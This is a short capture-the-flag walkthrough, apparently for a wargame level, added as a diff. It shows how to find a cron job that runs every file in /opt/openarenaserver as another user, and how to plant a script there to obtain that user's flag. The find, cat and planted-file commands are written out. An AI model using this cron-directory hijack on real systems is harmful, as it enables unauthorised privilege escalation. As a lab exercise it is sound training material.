@@ -1,0 +1,28 @@
+Here, there is no file like before, so we'll try to find one by searching a file like the previous:
+find /* 2>/dev/null | grep "level05"
+and we get: 
+
+/etc/apache2/sites-available/level05.conf
+/etc/apache2/sites-enabled/level05.conf
+/rofs/etc/apache2/sites-available/level05.conf
+/rofs/etc/apache2/sites-enabled/level05.conf
+/rofs/var/mail/level05
+/var/mail/level05
+
+If we cat /var/mail/level05 we have:
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+That's a cron table that will execute sh /usr/sbin/openarenaserver
+So let's see what's inside this file:
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+This file will execute every file in /opt/openarenaserver/
+So just create a file and put something like:
+getflag > /tmp/flag
+
+We just have to wait a little bit and we just have to cat /tmp/flag to get the flag !
